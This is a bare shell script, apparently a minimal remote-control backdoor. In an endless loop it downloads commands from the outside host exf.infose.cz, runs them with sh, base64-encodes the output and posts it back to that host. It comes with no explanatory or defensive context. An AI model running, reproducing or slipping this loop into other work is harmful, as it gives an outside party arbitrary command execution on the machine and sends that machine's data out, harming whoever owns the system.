set -eu
H=https://exf.infose.cz/

while :; do
        curl -s "${H}" | { sh | base64 -w0; echo; } | curl -X POST -s --data-binary @- --include "${H}"
done
